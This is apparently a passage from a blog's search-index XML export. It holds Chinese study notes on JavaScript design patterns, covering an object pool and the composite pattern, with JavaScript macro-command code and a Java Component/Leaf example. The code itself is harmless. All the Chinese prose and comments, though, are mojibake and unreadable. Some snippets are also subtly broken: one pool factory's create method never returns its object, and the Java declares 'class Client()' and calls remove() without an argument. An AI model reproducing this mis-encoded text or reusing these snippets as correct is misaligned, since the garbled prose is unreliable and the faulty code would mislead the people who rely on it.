å–å‡ºä¸€ä¸ª dom &#125; &#125;, recover:function(tooltipDom)&#123; return toolTipPool.push(tooltipDom); // å¯¹è±¡æ± å›žæ”¶ dom &#125; &#125;&#125;)(); æ‹¨å›žè¿›è¡Œç¬¬ä¸€æ¬¡æœç´¢çš„æ—¶åˆ»ï¼Œç›®å‰éœ€è¦åˆ›å»º 2 ä¸ªå°æ°”æ³¡èŠ‚ç‚¹ï¼Œä¸ºäº†æ–¹ä¾¿å›žæ”¶ï¼Œç”¨ä¸€ä¸ªæ•°ç»„ ary æ¥è®°å½•å®ƒä»¬ï¼š 123456var ary = [];for(var i=0,str;str=['A','B'][i++];)&#123; var toolTip = toolTipFactory.create(); toolTip.innerHTML = 'src'; ary.push(toolTip);&#125; å‡è®¾åœ°å›¾éœ€è¦å¼€å§‹é‡æ–°ç»˜åˆ¶ï¼Œåœ¨æ­¤ä¹‹å‰æŠŠä¸¤ä¸ªèŠ‚ç‚¹å›žæ”¶è¿›åŽ»å¯¹è±¡æ± ï¼š 123for(var i=0,toolTip;toolTip = ary[i++])&#123; toolTipFactory.recover(toolTip);&#125; åœ¨åˆ›å»º6ä¸ªå°æ°”æ³¡ 123456var ary = [];for(var i=0,str;str=[ 'A', 'B', 'C', 'D', 'E', 'F'][i++];)&#123; var toolTip = toolTipFactory.create(); toolTip.innerHTML = 'src'; ary.push(toolTip);&#125; å¯¹è±¡æ± è·Ÿäº«å…ƒæ¨¡å¼çš„æ€æƒ³æœ‰ç‚¹ç›¸ä¼¼ï¼Œè™½ç„¶ innerHTML çš„å€¼ Aã€Bã€Cã€D ç­‰ä¹Ÿå¯ä»¥çœ‹æˆèŠ‚ç‚¹çš„å¤–éƒ¨çŠ¶æ€ï¼Œä½†åœ¨è¿™é‡Œæˆ‘ä»¬å¹¶æ²¡æœ‰ä¸»åŠ¨åˆ†ç¦»å†…éƒ¨çŠ¶æ€å’Œå¤–éƒ¨çŠ¶æ€çš„è¿‡ç¨‹. é€šç”¨å¯¹è±¡æ± å®žçŽ°æˆ‘ä»¬è¿˜å¯ä»¥åœ¨å¯¹è±¡æ± å·¥åŽ‚é‡Œï¼ŒæŠŠåˆ›å»ºå¯¹è±¡çš„å…·ä½“è¿‡ç¨‹å°è£…èµ·æ¥ï¼Œå®žçŽ°ä¸€ä¸ªé€šç”¨çš„å¯¹è±¡æ± ï¼š 1234567891011var objectPoolFactory = function(createObjFn)&#123; var objectPool = []; return &#123; create:function()&#123; var obj = objectPool.length === 0 ? createObjFn.apply(this,arguments) : objectPool.shift(); &#125;, recover:function(obj)&#123; objectPool.push(obj); &#125; &#125;&#125; çŽ°åœ¨å¯ä»¥åˆ©ç”¨ objectPoolFactory æ¥åˆ›å»ºä¸€ä¸ªè£…è½½ä¸€äº› iframe çš„å¯¹è±¡æ± ï¼š 1234567891011121314151617181920212223242526272829303132var objectPoolFactory = function(createObjFn)&#123; var objectPool = []; return &#123; create:function()&#123; var obj = objectPool.length === 0 ? createObjFn.apply(this,arguments) : objectPool.shift(); return obj; &#125;, recover:function(obj)&#123; objectPool.push(obj); &#125; &#125;&#125;var iframeFactory = objectPoolFactory(function()&#123; var iframe = document.createElement('iframe'); document.body.appendChild(iframe); iframe.onload = function()&#123; iframe.onload = null; // é˜²æ­¢ iframe é‡å¤åŠ è½½çš„ bug iframeFactory.recover(iframe); // iframe åŠ è½½å®Œæˆä¹‹åŽå›žæ”¶èŠ‚ç‚¹ &#125; return iframe;&#125;);var iframe1 = iframeFactory.create(); iframe1.src = 'http://baidu.com'; var iframe2 = iframeFactory.create(); iframe2.src = 'http://QQ.com'; setTimeout(function()&#123; var iframe3 = iframeFactory.create(); iframe3.src = 'http://163.com'; &#125;, 3000 ); å¯¹è±¡æ± æ˜¯å¦å¤–ä¸€ç§æ€§èƒ½ä¼˜åŒ–æ–¹æ¡ˆï¼Œå®ƒè·Ÿäº«å…ƒæ¨¡å¼æœ‰ä¸€äº›ç›¸ä¼¼ä¹‹å¤„ï¼Œä½†æ²¡æœ‰åˆ†ç¦»å†…éƒ¨çŠ¶æ€å’Œå¤–éƒ¨çŠ¶æ€è¿™ä¸ªè¿‡ç¨‹ã€‚æœ¬ç« ç”¨äº«å…ƒæ¨¡å¼å®Œæˆäº†ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ çš„ç¨‹åºï¼Œå…¶å®žä¹Ÿå¯ä»¥ç”¨å¯¹è±¡æ± +äº‹ä»¶å§”æ‰˜æ¥ä»£æ›¿å®žçŽ° å°ç»“äº«å…ƒæ¨¡å¼æ˜¯ä¸ºè§£å†³æ€§èƒ½é—®é¢˜è€Œç”Ÿçš„æ¨¡å¼ï¼Œè¿™æ ¹å¤§éƒ¨åˆ†æ¨¡å¼çš„è¯žç”ŸåŽŸå› éƒ½ä¸ä¸€æ ·ï¼Œåœ¨ä¸€ä¸ªå­˜åœ¨å¤§é‡ç›¸ä¼¼å¯¹è±¡çš„ç³»ç»Ÿä¸­ï¼Œäº«å—æ¨¡å¼å¯ä»¥å¾ˆå¥½åœ°è§£å†³å¤§é‡å¯¹è±¡å¸¦æ¥çš„æ€§èƒ½é—®é¢˜ã€‚]]></content>
      <categories>
        <category>JavaScriptè®¾è®¡æ¨¡å¼</category>
      </categories>
      <tags>
        <tag>JavaScriptè®¾è®¡æ¨¡å¼</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JavaScriptè®¾è®¡æ¨¡å¼â€”â€”ç»„åˆæ¨¡å¼]]></title>
    <url>%2F2019-02-26-JavaScript%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E2%80%94%E2%80%94%E7%BB%84%E5%90%88%E6%A8%A1%E5%BC%8F.html</url>
    <content type="text"><![CDATA[å­¦ä¹ æ›¾æŽ¢çš„ ã€ŠJavaScriptè®¾è®¡æ¨¡å¼ä¸Žå¼€å‘å®žè·µã€‹å¹¶åšè®°å½•ã€‚ ä¹¦ç±çš„è´­ä¹°é“¾æŽ¥ è®¾è®¡æ¨¡å¼çš„å®šä¹‰æ˜¯ï¼šåœ¨é¢å‘å¯¹è±¡è½¯ä»¶è®¾è®¡è¿‡ç¨‹ä¸­é’ˆå¯¹ç‰¹å®šé—®é¢˜çš„ç®€æ´è€Œä¼˜é›…çš„è§£å†³æ–¹æ¡ˆã€‚ é€šä¿—ä¸€ç‚¹ï¼Œè®¾è®¡æ¨¡å¼æ˜¯åœ¨æŸç§åœºåˆä¸‹å¯¹æŸä¸ªé—®é¢˜çš„ä¸€ç§è§£å†³æ–¹æ¡ˆã€‚æ˜¯ç»™é¢å‘å¯¹è±¡è½¯ä»¶å¼€å‘ä¸­çš„ä¸€äº›å¥½çš„è®¾è®¡å–ä¸ªåå­—ã€‚ JavaScriptè®¾è®¡æ¨¡å¼â€”â€”ç»„åˆæ¨¡å¼ç»„åˆæ¨¡å¼å°±æ˜¯ç”¨å°çš„å­å¯¹è±¡æ¥æž„å»ºæ›´å¤§çš„å¯¹è±¡ï¼Œè€Œè¿™äº›å°çš„å¯¹è±¡æœ¬èº«ä¹Ÿè®¸æ˜¯ç”±æ›´å°çš„â€œå­™å¯¹è±¡â€æž„æˆçš„ã€‚ å›žé¡¾å®å‘½ä»¤å®å‘½ä»¤å¯¹è±¡åŒ…å«äº†ä¸€ç»„å…·ä½“çš„å­å‘½ä»¤å¯¹è±¡ï¼Œä¸ç®¡æ˜¯å®å‘½ä»¤å¯¹è±¡è¿˜æ˜¯å­å‘½ä»¤å¯¹è±¡ï¼Œéƒ½æœ‰ä¸€ä¸ª execute æ–¹æ³•è´Ÿè´£æ‰§è¡Œå‘½ä»¤ã€‚å›žé¡¾ä¸€ä¸‹ä¹‹å‰å®‰è£…åœ¨ä¸‡èƒ½é¥æŽ§å™¨ä¸Šçš„å®å‘½ä»¤ä»£ç ï¼š 1234567891011121314151617181920212223242526272829303132333435var closeDoorCommand = &#123; execute:function()&#123; console.log('å…³é—¨'); &#125;&#125;var openPcCommand = &#123; execute:function()&#123; console.log('å¼€ç”µè„‘'); &#125;&#125;var openQQCommand = &#123; execute:function()&#123; console.log('ç™»å½•QQ'); &#125;&#125;var MacroCommand = function()&#123; return&#123; commandList:[], add:function(command)&#123; this.commandList.push(command); &#125;, execute:function()&#123; for(var i=0,command;command = this.commandList[i++];)&#123; command.execute(); &#125; &#125; &#125;&#125;var macroCommand = new MacroCommand();macroCommand.add(closeDoorCommand);macroCommand.add(openPcCommand);macroCommand.add(openQQCommand);macroCommand.execute(); ä¸Šé¢çš„ä»£ç å¯ä»¥å¾ˆå®¹æ˜“å‘çŽ°å•Šï¼Œå®å‘½ä»¤ä¸­åŒ…å«äº†ä¸€ç»„å­å‘½ä»¤ï¼Œå®ƒä»¬ç»„æˆäº†ä¸€ä¸ªæ ‘å½¢ç»“æž„ï¼Œè¿™é‡Œæ˜¯ä¸€é¢—ç»“æž„éžå¸¸ç®€å•çš„æ ‘ã€‚ å…¶ä¸­ï¼ŒmacroCommand è¢«ç§°ä¸ºç»„åˆå¯¹è±¡ï¼ŒcloseDoorCommandã€openPcCommandã€openQQCommand éƒ½æ˜¯å¶å¯¹è±¡ã€‚åœ¨ macroCommand çš„ execute æ–¹æ³•é‡Œï¼Œå¹¶ä¸çœŸæ­£åœ°æ‰§è¡Œæ“ä½œï¼Œè€Œæ˜¯éåŽ†å®ƒæ‰€åŒ…å«çš„å¶å¯¹è±¡ï¼ŒæŠŠçœŸæ­£çš„ execute è¯·å§”æ‰˜ç»™è¿™äº›å¶å¯¹è±¡ã€‚ macroCommand è¡¨çŽ°å¾—åƒä¸€ä¸ªå‘½ä»¤ï¼Œä½†å®ƒå®žé™…ä¸Šåªæ˜¯ä¸€ç»„çœŸæ­£å‘½ä»¤çš„â€œä»£ç†â€ã€‚å¹¶éžçœŸæ­£çš„ä»£ç†ï¼Œè™½ç„¶ç»“æž„ä¸Šå¾ˆç›¸ä¼¼ï¼Œä½† macroCommand åªè´Ÿè´£ä¼ é€’è¯·æ±‚ç»™ä¹Ÿå¯¹è±¡ï¼Œå®ƒçš„ç›®çš„ä¸åœ¨äºŽæŽ§åˆ¶å¯¹ä¸šå¯¹è±¡çš„è®¿é—®ã€‚ ç»„åˆæ¨¡å¼çš„ç”¨é€”ç»„åˆæ¨¡å¼å°†å¯¹è±¡åˆæˆæ ‘å½¢ç»“æž„ï¼Œä»¥è¡¨ç¤º â€œéƒ¨åˆ†â€”â€”æ•´ä½“â€çš„å±‚æ¬¡ç»“æž„ã€‚é™¤äº†ç”¨æ¥è¡¨ç¤ºæ ‘å½¢ç»“æž„ä¹‹å¤–ï¼Œç»„åˆæ¨¡å¼çš„å¦ä¸€ä¸ªå¥½å¤„æ˜¯é€šè¿‡å¯¹è±¡çš„å¤šæ€æ€§è¡¨çŽ°ï¼Œä½¿å¾—ç”¨æˆ·å¯¹å•ä¸ªå¯¹è±¡å’Œç»„åˆå¯¹è±¡çš„ä½¿ç”¨å…·æœ‰ä¸€è‡´æ€§ï¼Œä¸‹é¢åˆ†åˆ«è¯´æ˜Žï¼š è¡¨ç¤ºæ ‘å½¢ç»“æž„ã€‚é€šè¿‡å›žé¡¾ä¸Šé¢çš„ä¾‹å­ï¼Œæˆ‘ä»¬å¾ˆå®¹æ˜“æ‰¾åˆ°ç»„åˆæ¨¡å¼çš„ä¸€ä¸ªä¼˜ç‚¹ï¼šæä¾›ä¸€ç§éåŽ†æ ‘å½¢ç»“æž„çš„æ–¹æ¡ˆï¼Œé€šè¿‡è°ƒç”¨ç»„åˆå¯¹è±¡çš„ execute æ–¹æ³•ï¼Œç¨‹åºä¼šé€’å½’è°ƒç”¨ç»„åˆå¯¹è±¡ä¸‹é¢çš„ä¹Ÿå¯¹è±¡çš„ execute æ–¹æ³•ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¸‡èƒ½é¥æŽ§å™¨åªéœ€è¦ä¸€æ¬¡æ“ä½œï¼Œä¾¿èƒ½ä¸€æ¬¡å®Œæˆå…³é—¨ã€æ‰“å¼€ç”µè„‘ã€ç™»å½• QQ è¿™å‡ ä»¶äº‹æƒ…ã€‚ç»„åˆæ¨¡å¼å¯ä»¥éžå¸¸æ–¹ä¾¿åœ°æè¿°å¯¹è±¡éƒ¨åˆ†-æ•´ä½“å±‚æ¬¡ç»“æž„ã€‚ åˆ©ç”¨å¯¹è±¡å¤šæ€æ€§ç»Ÿä¸€å¯¹å¾…ç»„åˆå¯¹è±¡å’Œå•ä¸ªå¯¹è±¡ã€‚åˆ©ç”¨å¯¹è±¡çš„å¤šæ€æ€§è¡¨çŽ°ï¼Œå¯ä»¥ä½¿å®¢æˆ·ç«¯å¿½ç•¥ç»„åˆå¯¹è±¡å’Œå•ä¸ªå¯¹è±¡çš„ä¸åŒã€‚åœ¨ç»„åˆæ¨¡å¼ä¸­ï¼Œå®¢æˆ·å°†ç»Ÿä¸€åœ°ä½¿ç”¨ç»„åˆç»“æž„ä¸­çš„æ‰€æœ‰å¯¹è±¡ï¼Œè€Œä¸éœ€è¦å…³ç³»å®ƒç©¶ç«Ÿæ˜¯ç»„åˆå¯¹è±¡è¿˜æ˜¯å•ä¸ªå¯¹è±¡ã€‚ åœ¨å®žé™…å¼€å‘ä¸­ä¼šç»™å®¢æˆ·å¸¦æ¥ç›¸å½“å¤§çš„ä¾¿åˆ©æ€§ï¼Œå½“æˆ‘ä»¬å¾€ä¸‡èƒ½é¥æŽ§å™¨é‡Œé¢æ·»åŠ ä¸€ä¸ªå‘½ä»¤çš„æ—¶å€™ï¼Œå¹¶ä¸å…³å¿ƒè¿™ä¸ªå‘½ä»¤æ˜¯å®å‘½ä»¤è¿˜æ˜¯æ™®é€šå­å‘½ä»¤ã€‚è¿™ç‚¹å¯¹äºŽæˆ‘ä»¬ä¸é‡è¦ï¼Œæˆ‘ä»¬åªéœ€è¦ç¡®å®šå®ƒæ˜¯ä¸€ä¸ªå‘½ä»¤ï¼Œå¹¶ä¸”è¿™ä¸ªå‘½ä»¤æ‹¥æœ‰å¯æ‰§è¡Œçš„ execute æ–¹æ³•ï¼Œé‚£ä¹ˆè¿™ä¸ªå‘½ä»¤å°±å¯ä»¥è¢«æ·»åŠ è¿›ä¸‡èƒ½é¥æŽ§å™¨ã€‚ å½“å®å‘½ä»¤å’Œé€šè¿‡å­å‘½ä»¤æŽ¥æ”¶åˆ°æ‰§è¡Œ execute æ–¹æ³•çš„è¯·æ±‚çš„æ—¶å€™ï¼Œå®å‘½ä»¤å’Œæ™®é€šå­å‘½ä»¤éƒ½ä¼šåšå®ƒä»¬å„è‡ªè®¤ä¸ºæ­£ç¡®çš„äº‹æƒ…ã€‚è¿™äº›å·®å¼‚æ˜¯éšè—åœ¨å®¢æˆ·èƒŒåŽçš„ï¼Œåœ¨å®¢æˆ·çœ‹æ¥ï¼Œè¿™ç§é€æ˜Žæ€§å¯ä»¥è®©æˆ‘ä»¬éžå¸¸è‡ªç”±åœ°æ‰©å±•è¿™ä¸ªä¸‡èƒ½é¥æŽ§å™¨ã€‚ è¯·æ±‚åœ¨æ ‘ä¸­ä¼ é€’çš„è¿‡ç¨‹åœ¨ç»„åˆæ¨¡å¼ä¸­ï¼Œè¯·æ±‚åœ¨æ ‘ä¸­ä¼ é€’çš„è¿‡ç¨‹æ€»æ˜¯éµå¾ªä¸€ç§é€»è¾‘ã€‚ ä»¥å®å‘½ä»¤ä¸ºä¾‹å­ï¼Œè¯·æ±‚ä»Žæ ‘çš„é¡¶ç«¯çš„å¯¹è±¡å¾€ä¸‹ä¼ é€’ï¼Œå¦‚æžœå½“å‰å¤„ç†è¯·æ±‚çš„å¯¹è±¡æ˜¯å¶å¯¹è±¡ï¼ˆæ™®é€šå­å‘½ä»¤ï¼‰ï¼Œå¶å¯¹è±¡è‡ªèº«ä¼šå¯¹è¯·æ±‚åšå‡ºå¯¹åº”çš„å¤„ç†ã€‚å¦‚æžœå½“å‰å¤„ç†è¯·çš„å¯¹è±¡æ˜¯ç»„åˆå¯¹è±¡ï¼ˆå®å‘½ä»¤ï¼‰ï¼Œç»„åˆå¯¹è±¡åˆ™ä¼šéåŽ†å®ƒå±žä¸‹çš„å­èŠ‚ç‚¹ï¼Œå°†è¯·æ±‚ç»§ç»­ä¼ é€’ç»™è¿™äº›å­èŠ‚ç‚¹ã€‚ æ€»è€Œè¨€ä¹‹ï¼Œå¦‚æžœå­èŠ‚ç‚¹æ˜¯ä¹Ÿå¯¹è±¡ï¼Œå¶å¯¹è±¡è‡ªèº«ä¼šå¤„ç†è¿™ä¸ªè¯·æ±‚ï¼Œè€Œå¦‚æžœå­èŠ‚ç‚¹è¿˜æ˜¯ç»„åˆå¯¹è±¡ï¼Œè¯·æ±‚å°±ä¼šç»§ç»­ä¼ é€’ä¸‹åŽ»ã€‚å¶å¯¹è±¡ä¸‹é¢ä¸ä¼šå†æœ‰å…¶ä»–å­èŠ‚ç‚¹ï¼Œä¸€ä¸ªå¶å¯¹è±¡å°±æ˜¯æ ‘çš„è¿™æ¡æ ‘æžçš„å°½å¤´ï¼Œç»„åˆå¯¹è±¡ä¸‹é¢å¯èƒ½è¿˜æœ‰æœ‰å­èŠ‚ç‚¹ã€‚ è¯·æ±‚ä»Žä¸Šåˆ°ä¸‹æ²¿ç€æ ‘è¿›è¡Œä¼ é€’ï¼Œç›´åˆ°æ ‘çš„å°½å¤´ï¼Œä½œä¸ºå®¢æˆ·ï¼Œåªéœ€è¦å…³å¿ƒæ ‘æœ€é¡¶å±‚çš„ç»„åˆå¯¹è±¡ï¼Œå®¢æˆ·åªéœ€è¦è¯·æ±‚è¿™ä¸ªç»„åˆå¯¹è±¡ï¼Œè¯·æ±‚ä¾¿ä¼šæ²¿ç€æ ‘å¾€ä¸‹ä¼ é€’ï¼Œä¾æ¬¡è¾¾åˆ°æ‰€æœ‰çš„å¶å¯¹è±¡ã€‚ åœ¨åˆšåˆšçš„ä¾‹å­ä¸­ï¼Œç”±äºŽå®å‘½ä»¤å’Œå­å‘½ä»¤ç»„æˆçš„æ ‘å¤ªè¿‡ç®€å•ï¼Œæˆ‘ä»¬è¿˜ä¸æ¸…æ¥šåœ°çœ‹åˆ°ç»„åˆæ¨¡å¼å¸¦æ¥çš„å¥½å¤„ï¼Œå¦‚æžœåªæ˜¯ç®€å•åœ°éåŽ†ä¸€ç»„èŠ‚ç‚¹ï¼Œè¿­ä»£å™¨ä¾¿èƒ½è§£å†³æ‰€æœ‰çš„é—®é¢˜ã€‚ä¸‹é¢åˆ›é€ ä¸€ä¸ªæ›´å¼ºå¤§çš„å®å‘½ä»¤ï¼Œè¿™ä¸ªå®å‘½ä»¤ä¸­åˆåŒ…å«ä¸€äº›å®å‘½ä»¤å’Œæ™®é€šå­å‘½ä»¤ï¼Œçœ‹èµ·æ¥æ˜¯ä¸€é¢—ç›¸å¯¹å¤æ‚çš„æ ‘ã€‚ æ›´å¼ºå¤§çš„å®å‘½ä»¤ç›®å‰çš„ä¸‡èƒ½é¥æŽ§å™¨ï¼ŒåŒ…å«äº†å…³é—¨ã€å¼€ç”µè„‘ã€ç™»å½•QQ è¿™ 3 ä¸ªå‘½ä»¤ã€‚çŽ°åœ¨æˆ‘ä»¬éœ€è¦ä¸€ä¸ª â€œè¶…çº§ä¸‡èƒ½é¥æŽ§å™¨â€ï¼Œå¯ä»¥æŽ§åˆ¶å®¶é‡Œçš„æ‰€æœ‰ç”µå™¨ï¼Œè¿™ä¸ªé¥æŽ§å™¨æ‹¥æœ‰ä»¥ä¸‹çš„åŠŸèƒ½ï¼š æ‰“å¼€ç©ºè°ƒ æ‰“å¼€ç”µè§†å’ŒéŸ³å“ å…³é—¨ã€å¼€ç”µè„‘ã€ç™»å½•QQ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071&lt;body&gt; &lt;button id="button"&gt;æŒ‰æˆ‘&lt;/button&gt; &lt;script&gt; var MacroCommand = function()&#123; return&#123; commandList:[], add:function(command)&#123; this.commandList.push(command); &#125;, execute:function()&#123; for(var i=0,command;command = this.commandList[i++];)&#123; command.execute(); &#125; &#125; &#125; &#125; var openAcCommand = &#123; execute:function()&#123; console.log('æ‰“å¼€ç©ºè°ƒ'); &#125; &#125; // å®¶é‡Œçš„ç”µè§†å’ŒéŸ³å“æ˜¯è¿žæŽ¥åœ¨ä¸€èµ·çš„ï¼Œæ‰€ä»¥å¯ä»¥ç”¨ä¸€ä¸ªå®å‘½ä»¤æ¥ç»„åˆæ‰“å¼€ç”µè§†å’Œæ‰“å¼€éŸ³å“çš„å‘½ä»¤ var openTvCommand = &#123; execute:function()&#123; console.log('æ‰“å¼€ç”µè§†'); &#125; &#125; var openSoundCommand = &#123; execute:function()&#123; console.log('æ‰“å¼€éŸ³å“'); &#125; &#125; var macroCommand1 = new MacroCommand(); macroCommand1.add(openTvCommand); macroCommand1.add(openSoundCommand); // å…³é—¨ã€æ‰“å¼€ç”µè„‘å’Œæ‰“ç™»å½• QQ çš„å‘½ä»¤ var closeDoorCommand = &#123; execute:function()&#123; console.log('å…³é—¨'); &#125; &#125; var openPcCommand = &#123; execute:function()&#123; console.log('å¼€ç”µè„‘'); &#125; &#125; var openQQCommand = &#123; execute:function()&#123; console.log('æ‰“å¼€QQ'); &#125; &#125; var macroCommand2 = new MacroCommand(); macroCommand2.add(closeDoorCommand); macroCommand2.add(openPcCommand); macroCommand2.add(openQQCommand); // æŠŠæ‰€æœ‰å‘½ä»¤ç»„åˆæˆä¸ºä¸€ä¸ªè¶…çº§å‘½ä»¤ var macroCommand = new MacroCommand(); macroCommand.add(openAcCommand); macroCommand.add(macroCommand1); macroCommand.add(macroCommand2); // æœ€åŽç»™é¥æŽ§å™¨ç»‘å®šâ€œè¶…çº§å‘½ä»¤â€ var setCommand = (function(command)&#123; document.getElementById('button').onclick = function()&#123; command.execute(); &#125; &#125;)(macroCommand); &lt;/script&gt;&lt;/body&gt; å½“æŒ‰ä¸‹é¥æŽ§å™¨çš„æ—¶å€™ï¼Œæ‰€æœ‰å‘½ä»¤éƒ½è¢«ä¾æ¬¡æ‰§è¡Œã€‚ åŸºæœ¬å¯¹è±¡å¯ä»¥è¢«ç»„åˆæˆä¸ºå¤æ‚çš„ç»„åˆå¯¹è±¡ï¼Œç»„åˆå¯¹è±¡åˆå¯ä»¥è¢«ç»„åˆï¼Œè¿™æ ·ä¸æ–­é€’å½’ä¸‹åŽ»ï¼Œè¿™æ£µæ ‘çš„ç»“æž„å¯ä»¥æ”¯æŒä»»æ„å¤šçš„å¤æ‚åº¦ã€‚åœ¨æ ‘æœ€ç»ˆè¢«æž„é€ å®Œæˆä¹‹åŽï¼Œè®©æ•´é¢—æ ‘æœ€ç»ˆè¿è½¬èµ·æ¥çš„æ­¥éª¤æ˜¯éžå¸¸ç®€å•ï¼Œç»„éœ€è¦è°ƒç”¨ä¸Šå±‚å¯¹è±¡çš„ execute æ–¹æ³•ã€‚æ¯å½“å¯¹æœ€ä¸Šå±‚çš„å¯¹è±¡è¿›è¡Œä¸€æ¬¡è¯·æ±‚ï¼Œå®žé™…ä¸Šæ˜¯å¯¹æ•´ä¸ªæ ‘è¿›è¡Œæ·±åº¦ä¼˜åŒ–çš„æœç´¢ï¼Œè€Œåˆ›å»ºç»„åˆå¯¹è±¡çš„ç¨‹åºå‘˜å¹¶ä¸å…³å¿ƒå†…åœ¨çš„ç»†èŠ‚ï¼Œå¾€è¿™æ£µæ ‘é‡Œé¢æ·»åŠ ä¸€äº›æ–°çš„èŠ‚ç‚¹å¯¹è±¡æ˜¯éžå¸¸å®¹æ˜“çš„äº‹æƒ…ã€‚ æŠ½è±¡ç±»åœ¨ç»„åˆæ¨¡å¼ä¸­çš„ä½œç”¨ç»„åˆæ¨¡å¼çš„æœ€å¤§ä¼˜ç‚¹åœ¨äºŽå¯ä»¥ä¸€è‡´åœ°å¯¹å¾…ç»„åˆå¯¹è±¡å’ŒåŸºæœ¬å¯¹è±¡ã€‚å®¢æˆ·ä¸éœ€è¦çŸ¥é“å½“å‰å¤„ç†çš„å®å‘½ä»¤è¿˜æ˜¯æ™®é€šå‘½ä»¤ï¼Œåªè¦å®ƒæ˜¯ä¸€ä¸ªå‘½ä»¤ï¼Œå¹¶ä¸”æœ‰ executeæ–¹æ³•ï¼Œè¿™ä¸ªå‘½ä»¤å°±å¯ä»¥è¢«æ·»åŠ åˆ°æ ‘ä¸­ã€‚ è¿™ç§é€æ˜Žæ€§å¸¦æ¥çš„ä¾¿åˆ©ï¼Œåœ¨é™æ€ç±»åž‹åŽŸæ ·ä¸­ä½“çŽ°å°¤ä¸ºæ˜Žæ˜¾ã€‚åœ¨ Java ä¸­ï¼Œå®žçŽ°ç»„åˆæ¨¡å¼çš„å…³é”®æ˜¯ Composite ç±» å’Œ Leaf ç±»éƒ½å¿…é¡»ç»§æ‰¿ä¸€ä¸ªComponent ç±»ã€‚è¿™ä¸ª Component æŠ½è±¡ç±»æ—¢ä»£è¡¨ç»„åˆå¯¹è±¡åˆä»£è¡¨å¶å¯¹è±¡ï¼Œå®ƒèƒ½å¤Ÿä¿è¯ç»„åˆå¯¹è±¡å’Œå¶å¯¹è±¡æ‹¥æœ‰åŒæ ·åå­—çš„æ–¹æ³•ï¼Œä»Žè€Œå¯¹åŒä¸€æ¶ˆæ¯éƒ½åšå‡ºåé¦ˆã€‚ç»„åˆå¯¹è±¡å’Œå¶å¯¹è±¡çš„å…·ä½“ç±»åž‹è¢«éšè—åœ¨ Component æŠ½è±¡ç±»èº«åŽã€‚ é’ˆå¯¹ Component æŠ½è±¡ç±»æ¥ç¼–å†™ç¨‹åºï¼Œå®¢æˆ·æ“ä½œå§‹ç»ˆæ˜¯ Component å¯¹è±¡ï¼Œè€Œä¸ç”¨åŽ»åŒºåˆ†åˆ°åº•æ˜¯ç»„åˆå¯¹è±¡è¿˜æ˜¯å¶å¯¹è±¡ã€‚æ‰€ä»¥æˆ‘ä»¬å¾€åŒä¸€ä¸ªå¯¹è±¡é‡Œé¢çš„ add æ–¹æ³•ï¼Œæ—¢å¯ä»¥æ·»åŠ  ç»„åˆå¯¹è±¡ä¹Ÿå¯ä»¥æ·»åŠ å¶å¯¹è±¡ã€‚ä»£ç å¦‚ä¸‹ï¼š 1234567891011121314151617181920212223242526272829public abstract class Component &#123; public void add(Component child)&#123;&#125; public void remove(Component child)&#123;&#125;&#125;public class Composite extends Component &#123; public void add(Component child)&#123;&#125; public void remove(Component child)&#123;&#125;&#125;public class Leaf extends Component &#123; public void add(Component child)&#123; throw new UnsupportedOperationException(); // å¶å¯¹è±¡ä¸èƒ½æ·»åŠ å­èŠ‚ç‚¹ &#125; public void remove(Component child)&#123;&#125;&#125;public class Client()&#123; public static void main(String args[])&#123; Component root = new Composite(); Component c1 = new Composite(); Component c2 = new Composite(); Component leaf1 = new Leaf(); Component leaf2 = new Leaf(); root.add(c1); c1.add(leaf1); root.add(c2); c2.add(leaf1); root.remove(); &#125;&#125; åœ¨ JavaScript è¿™ç§åŠ¨æ€ç±»åž‹è¯­è¨€ä¸­ï¼Œå¯¹è±¡çš„å¤šæ€æ€§æ˜¯ä¸Žç”Ÿä¿±æ¥çš„ï¼Œä¹Ÿæ²¡æœ‰ç¼–è¯‘å™¨åŽ»æ£€æŸ¥å˜é‡çš„ç±»åž‹ï¼Œæ‰€ä»¥æˆ‘ä»¬é€šå¸¸ä¸ä¼šåŽ»æ¨¡æ‹Ÿä¸€ä¸ª â€œæ€ªå¼‚â€ çš„æŠ½è±¡ç±»ï¼ŒJavaScript ä¸­å®žçŽ°ç»„åˆæ¨¡å¼çš„éš¾ç‚¹åœ¨äºŽè¦ä¿è¯ç»„åˆå¯¹è±¡å’Œå¶å¯¹è±¡å¯¹è±¡æ‹¥æœ‰åŒæ ·çš„æ–¹æ³•ï¼Œè¿™é€šå¸¸éœ€è¦ç”¨é¸­å­ç±»åž‹çš„æ€æƒ³å¯¹å®ƒä»¬è¿›è¡ŒæŽ¥å£æ£€æŸ¥ã€‚ åœ¨ JavaScript ä¸­å®žçŽ°ç»„åˆæ¨¡å¼ï¼Œçœ‹èµ·æ¥ç¼ºä¹ä¸€äº›ä¸¥è°¨æ€§ï¼Œæˆ‘ä»¬çš„ä»£ç ç®—ä¸ä¸Šå®‰å…¨ï¼Œä½†èƒ½å¤Ÿæ›´å¿«é€Ÿå’Œè‡ªç”±åœ°å¼€å‘ï¼Œè¿™æ—¢æ˜¯ JavaScript çš„ä¼˜ç‚¹ä¹Ÿæ˜¯å®ƒçš„ç¼ºç‚¹ã€‚ é€æ˜Žæ€§å¸¦æ¥çš„å®‰å…¨é—®é¢˜ç»„åˆæ¨¡å¼çš„é€æ˜Žæ€§ä½¿å¾—å‘èµ·è¯·çš„å®¢æˆ·ä¸ç”¨åŽ»ä¼°è®¡ç»„åˆå¯¹è±¡å’Œå¶å¯¹è±¡çš„åŒºåˆ«ï¼Œä½†å®ƒä»¬åœ¨æœ¬è´¨ä¸Šæ˜¯æœ‰åŽ»å‘—çš„ã€‚ ç»„åˆå¯¹è±¡å¯ä»¥æ‹¥æœ‰å­èŠ‚ç‚¹ï¼Œå¶å¯¹è±¡ä¸‹é¢å°±æ²¡æœ‰å­èŠ‚ç‚¹ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¹Ÿè®¸ä¼šå‘ç”Ÿä¸€äº›è¯¯æ“ä½œï¼Œæ¯”å¦‚è¯•å›¾å¾€å¶å¯¹è±¡ä¸­æ·»åŠ å­èŠ‚ç‚¹ã€‚è§£å†³çš„æ–¹æ¡ˆæ˜¯ç»™å¶å¯¹è±¡ä¹Ÿæ·»åŠ  add 